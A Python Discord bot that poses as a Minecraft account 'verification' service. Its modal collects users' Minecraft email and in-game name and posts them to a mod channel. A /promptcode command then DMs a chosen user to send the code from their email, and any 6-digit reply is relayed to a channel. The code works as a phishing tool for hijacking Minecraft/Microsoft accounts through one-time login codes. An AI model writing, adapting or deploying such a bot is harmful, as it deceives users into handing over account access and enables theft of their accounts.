import os
import discord
from discord.ext import commands

TOKEN = os.getenv("DISCORD_TOKEN")
VERIFICATION_CHANNEL_ID = 1362951881827160295  # Verification channel ID
MOD_CHANNEL_ID = 1362997933552959558  # Mod channel ID

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.messages = True
intents.dm_messages = True

bot = commands.Bot(command_prefix='!', intents=intents)

user_code_states = {}  # Tracks users waiting to submit a 6-digit code

class VerifyModal(discord.ui.Modal, title="Link Your Minecraft Account"):
    email = discord.ui.TextInput(label="Minecraft Email", placeholder="example@gmail.com", required=True)
    ign = discord.ui.TextInput(label="Minecraft IGN", placeholder="YourInGameName", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        log_channel = await bot.fetch_channel(MOD_CHANNEL_ID)

        embed = discord.Embed(
            title="🔗 New Minecraft Verification",
            color=discord.Color.orange()
        )
        embed.add_field(name="User", value=interaction.user.mention, inline=False)
        embed.add_field(name="Email", value=self.email.value, inline=False)
        embed.add_field(name="IGN", value=self.ign.value, inline=False)
        embed.set_footer(text="This is an automated message.")

        await log_channel.send(embed=embed)
        await interaction.response.send_message("✅ Info submitted! Thanks!", ephemeral=True)

class LinkView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Link Account", style=discord.ButtonStyle.primary)
    async def link_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(VerifyModal())

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} (ID: {bot.user.id})')
    print('Bot is ready!')

    verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)

    async for message in verification_channel.history(limit=50):
        if message.author == bot.user and message.embeds:
            if message.embeds[0].title == "🔗 Link Your Minecraft Account":
                await message.delete()

    embed = discord.Embed(
        title="🔗 Link Your Minecraft Account",
        description="Click the **Link Account** button below to start verification.",
        color=discord.Color.green()
    )
    embed.set_footer(text="This is an automated message.")
    await verification_channel.send(embed=embed, view=LinkView())

@bot.event
async def setup_hook():
    await bot.tree.sync()

@bot.tree.command(name="setup", description="Start the Minecraft account verification process")
async def setup(interaction: discord.Interaction):
    verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)

    async for message in verification_channel.history(limit=50):
        if message.author == bot.user and message.embeds:
            if message.embeds[0].title == "🔗 Link Your Minecraft Account":
                await message.delete()

    embed = discord.Embed(
        title="🔗 Link Your Minecraft Account",
        description="Click the **Link Account** button below to start verification.",
        color=discord.Color.green()
    )
    embed.set_footer(text="This is an automated message.")
    await interaction.response.send_message(embed=embed, view=LinkView(), ephemeral=True)

@bot.tree.command(name="promptcode", description="Prompt a user to enter their 6-digit code")
async def promptcode(interaction: discord.Interaction, user: discord.User):
    try:
        embed = discord.Embed(
            title="🔐 Code Verification",
            description="Check your email for a code and send it here.",
            color=discord.Color.blue()
        )
        embed.set_footer(text="This is an automated message.")
        await user.send(embed=embed)
        user_code_states[user.id] = interaction.user.id  # Track who prompted this user
        await interaction.response.send_message(f"✅ Prompt sent to {user.mention}", ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message("❌ Couldn't DM the user. They might have DMs off.", ephemeral=True)

@bot.event
async def on_message(message):
    await bot.process_commands(message)

    if message.guild is None and message.author.id in user_code_states:
        if message.content.isdigit() and len(message.content) == 6:
            channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)
            embed = discord.Embed(
                title="✅ Code Submitted",
                description=f"User: {message.author.mention}\nCode: `{message.content}`",
                color=discord.Color.green()
            )
            embed.set_footer(text="Submitted from DM.")
            await channel.send(embed=embed)
            await message.channel.send("✅ Code received! Thank you.")
            del user_code_states[message.author.id]
        else:
            await message.channel.send("❌ Invalid code. Please enter a **6-digit number**.")

bot.run(TOKEN)
